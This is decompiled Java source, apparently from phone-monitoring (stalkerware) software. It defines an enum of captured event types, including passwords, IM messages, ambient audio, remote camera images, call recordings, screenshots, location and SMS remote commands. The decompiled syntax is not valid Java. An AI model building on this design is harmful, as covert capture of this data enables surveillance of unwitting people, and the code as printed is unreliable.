package com.vvt.base;

import java.util.HashMap;
import java.util.Map;

public enum FxEventType
{
  private static final Map a;
  private final int number;
  
  static
  {
    int i = 3;
    int j = 2;
    int k = 1;
    int m = 40;
    int n = 0;
    Object localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("UNKNOWN", 0, 0);
    UNKNOWN = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("CALL_LOG", k, k);
    CALL_LOG = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("SMS", j, j);
    SMS = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("MAIL", i, i);
    MAIL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("MMS", 4, 8);
    MMS = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("BROWSER_URL", 5, 39);
    BROWSER_URL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("APPLICATION", 6, m);
    APPLICATION = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("VOIP_CALL_LOG", 7, 51);
    VOIP_CALL_LOG = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("PASSWORD", 8, 53);
    PASSWORD = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("IM", 9, 21);
    IM = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("IM_ACCOUNT", 10, 46);
    IM_ACCOUNT = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("IM_CONTACT", 11, 47);
    IM_CONTACT = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("IM_CONVERSATION", 12, 48);
    IM_CONVERSATION = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("IM_MESSAGE", 13, 49);
    IM_MESSAGE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("PIN_MESSAGE", 14, 31);
    PIN_MESSAGE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("PANIC_GPS", 15, 32);
    PANIC_GPS = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("PANIC_IMAGE", 16, 33);
    PANIC_IMAGE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("PANIC_STATUS", 17, 34);
    PANIC_STATUS = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("ALERT_GPS", 18, 35);
    ALERT_GPS = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("WALLPAPER_THUMBNAIL", 19, 29);
    WALLPAPER_THUMBNAIL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("CAMERA_IMAGE_THUMBNAIL", 20, 22);
    CAMERA_IMAGE_THUMBNAIL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("AUDIO_CONVERSATION_THUMBNAIL", 21, 24);
    AUDIO_CONVERSATION_THUMBNAIL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("AUDIO_FILE_THUMBNAIL", 22, 23);
    AUDIO_FILE_THUMBNAIL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("VIDEO_FILE_THUMBNAIL", 23, 25);
    VIDEO_FILE_THUMBNAIL = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("WALLPAPER", 24, 13);
    WALLPAPER = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("CAMERA_IMAGE", 25, 11);
    CAMERA_IMAGE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("AUDIO_CONVERSATION", 26, 27);
    AUDIO_CONVERSATION = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("AUDIO_FILE", 27, 14);
    AUDIO_FILE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("VIDEO_FILE", 28, 12);
    VIDEO_FILE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("DELETED_FILE", 29, 15);
    DELETED_FILE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("AUDIO_AMBIENT", 30, 41);
    AUDIO_AMBIENT = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("REMOTE_CAMERA_IMAGE", 31, 43);
    REMOTE_CAMERA_IMAGE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("VOIP_CALL_RECORDING", 32, 64);
    VOIP_CALL_RECORDING = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("APP_SCREENSHOT", 33, 70);
    APP_SCREENSHOT = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("LOCATION", 34, 9);
    LOCATION = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("CELL_INFO", 35, 10);
    CELL_INFO = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("SYSTEM", 36, 16);
    SYSTEM = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("DEBUG_EVENT", 37, 30);
    DEBUG_EVENT = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("SETTINGS", 38, 37);
    SETTINGS = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("ADDRESS_BOOK", 39, 28);
    ADDRESS_BOOK = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("SMS_REMOTE_COMMAND", m, m);
    SMS_REMOTE_COMMAND = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("NETWORK_REMOTE_COMMAND", 41, 45);
    NETWORK_REMOTE_COMMAND = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("SIM_CHANGE", 42, 42);
    SIM_CHANGE = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    ((FxEventType)localObject).<init>("ACTUAL_MEDIA_DAO", 43, 46);
    ACTUAL_MEDIA_DAO = (FxEventType)localObject;
    localObject = new com/vvt/base/FxEventType;
    int i1 = 44;
    int i2 = 44;
    ((FxEventType)localObject).<init>("EVENT_BASE", i1, i2);
    EVENT_BASE = (FxEventType)localObject;
    int i3 = 45;
    localObject = new FxEventType[i3];
    FxEventType localFxEventType1 = UNKNOWN;
    localObject[0] = localFxEventType1;
    localFxEventType1 = CALL_LOG;
    localObject[k] = localFxEventType1;
    localFxEventType1 = SMS;
    localObject[j] = localFxEventType1;
    localFxEventType1 = MAIL;
    localObject[i] = localFxEventType1;
    FxEventType localFxEventType2 = MMS;
    localObject[4] = localFxEventType2;
    localFxEventType2 = BROWSER_URL;
    localObject[5] = localFxEventType2;
    localFxEventType2 = APPLICATION;
    localObject[6] = localFxEventType2;
    localFxEventType2 = VOIP_CALL_LOG;
    localObject[7] = localFxEventType2;
    localFxEventType2 = PASSWORD;
    localObject[8] = localFxEventType2;
    localFxEventType2 = IM;
    localObject[9] = localFxEventType2;
    localFxEventType2 = IM_ACCOUNT;
    localObject[10] = localFxEventType2;
    localFxEventType2 = IM_CONTACT;
    localObject[11] = localFxEventType2;
    localFxEventType2 = IM_CONVERSATION;
    localObject[12] = localFxEventType2;
    localFxEventType2 = IM_MESSAGE;
    localObject[13] = localFxEventType2;
    localFxEventType2 = PIN_MESSAGE;
    localObject[14] = localFxEventType2;
    localFxEventType2 = PANIC_GPS;
    localObject[15] = localFxEventType2;
    localFxEventType2 = PANIC_IMAGE;
    localObject[16] = localFxEventType2;
    localFxEventType2 = PANIC_STATUS;
    localObject[17] = localFxEventType2;
    localFxEventType2 = ALERT_GPS;
    localObject[18] = localFxEventType2;
    localFxEventType2 = WALLPAPER_THUMBNAIL;
    localObject[19] = localFxEventType2;
    localFxEventType2 = CAMERA_IMAGE_THUMBNAIL;
    localObject[20] = localFxEventType2;
    localFxEventType2 = AUDIO_CONVERSATION_THUMBNAIL;
    localObject[21] = localFxEventType2;
    localFxEventType2 = AUDIO_FILE_THUMBNAIL;
    localObject[22] = localFxEventType2;
    localFxEventType2 = VIDEO_FILE_THUMBNAIL;
    localObject[23] = localFxEventType2;
    localFxEventType2 = WALLPAPER;
    localObject[24] = localFxEventType2;
    localFxEventType2 = CAMERA_IMAGE;
    localObject[25] = localFxEventType2;
    localFxEventType2 = AUDIO_CONVERSATION;
    localObject[26] = localFxEventType2;
    localFxEventType2 = AUDIO_FILE;
    localObject[27] = localFxEventType2;
    localFxEventType2 = VIDEO_FILE;
    localObject[28] = localFxEventType2;
    localFxEventType2 = DELETED_FILE;
    localObject[29] = localFxEventType2;
    localFxEventType2 = AUDIO_AMBIENT;
    localObject[30] = localFxEventType2;
    localFxEventType2 = REMOTE_CAMERA_IMAGE;
    localObject[31] = localFxEventType2;
    localFxEventType2 = VOIP_CALL_RECORDING;
    localObject[32] = localFxEventType2;
    localFxEventType2 = APP_SCREENSHOT;
    localObject[33] = localFxEventType2;
    localFxEventType2 = LOCATION;
    localObject[34] = localFxEventType2;
    localFxEventType2 = CELL_INFO;
    localObject[35] = localFxEventType2;
    localFxEventType2 = SYSTEM;
    localObject[36] = localFxEventType2;
    localFxEventType2 = DEBUG_EVENT;
    localObject[37] = localFxEventType2;
    localFxEventType2 = SETTINGS;
    localObject[38] = localFxEventType2;
    localFxEventType2 = ADDRESS_BOOK;
    localObject[39] = localFxEventType2;
    localFxEventType1 = SMS_REMOTE_COMMAND;
    localObject[m] = localFxEventType1;
    localFxEventType2 = NETWORK_REMOTE_COMMAND;
    localObject[41] = localFxEventType2;
    localFxEventType2 = SIM_CHANGE;
    localObject[42] = localFxEventType2;
    localFxEventType2 = ACTUAL_MEDIA_DAO;
    localObject[43] = localFxEventType2;
    localFxEventType2 = EVENT_BASE;
    localObject[44] = localFxEventType2;
    b = (FxEventType[])localObject;
    localObject = new java/util/HashMap;
    ((HashMap)localObject).<init>();
    a = (Map)localObject;
    localObject = values();
    int i4 = localObject.length;
    while (n < i4)
    {
      localFxEventType2 = localObject[n];
      Map localMap = a;
      m = localFxEventType2.number;
      Integer localInteger = Integer.valueOf(m);
      localMap.put(localInteger, localFxEventType2);
      n += 1;
    }
  }
  
  private FxEventType(int paramInt1)
  {
    this.number = paramInt1;
  }
  
  public static FxEventType forValue(int paramInt)
  {
    Map localMap = a;
    Integer localInteger = Integer.valueOf(paramInt);
    return (FxEventType)localMap.get(localInteger);
  }
  
  public static boolean isNoneRegularActualMedia(FxEventType paramFxEventType)
  {
    FxEventType localFxEventType = AUDIO_CONVERSATION;
    if (paramFxEventType != localFxEventType)
    {
      localFxEventType = AUDIO_AMBIENT;
      if (paramFxEventType != localFxEventType)
      {
        localFxEventType = REMOTE_CAMERA_IMAGE;
        if (paramFxEventType != localFxEventType) {
          break label31;
        }
      }
    }
    boolean bool = true;
    for (;;)
    {
      return bool;
      label31:
      bool = false;
      localFxEventType = null;
    }
  }
  
  public static boolean isThumbnail(FxEventType paramFxEventType)
  {
    FxEventType localFxEventType = WALLPAPER_THUMBNAIL;
    if (paramFxEventType != localFxEventType)
    {
      localFxEventType = CAMERA_IMAGE_THUMBNAIL;
      if (paramFxEventType != localFxEventType)
      {
        localFxEventType = AUDIO_CONVERSATION_THUMBNAIL;
        if (paramFxEventType != localFxEventType)
        {
          localFxEventType = AUDIO_FILE_THUMBNAIL;
          if (paramFxEventType != localFxEventType)
          {
            localFxEventType = VIDEO_FILE_THUMBNAIL;
            if (paramFxEventType != localFxEventType)
            {
              localFxEventType = PANIC_IMAGE;
              if (paramFxEventType != localFxEventType) {
                break label58;
              }
            }
          }
        }
      }
    }
    boolean bool = true;
    for (;;)
    {
      return bool;
      label58:
      bool = false;
      localFxEventType = null;
    }
  }
  
  public int getNumber()
  {
    return this.number;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/base/FxEventType.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */